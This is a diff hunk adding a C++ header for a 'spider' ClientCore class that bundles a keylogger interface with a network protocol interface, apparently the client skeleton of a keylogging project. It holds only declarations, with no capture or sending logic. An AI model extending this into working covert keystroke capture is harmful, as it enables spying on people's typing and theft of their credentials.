@@ -10,3 +10,21 @@
 
 #pragma once
 
+#include "KeyLogger/IKeyLogger.hpp"
+#include "Protocol/IProtocol.hpp"
+
+namespace spider
+{
+  class ClientCore
+  {
+  protected:
+    IKeyLogger	_keylogger;
+    IProtocol	_proto;
+
+  public:
+    ClientCore();
+    ~ClientCore();
+
+    void run();
+  };
+}
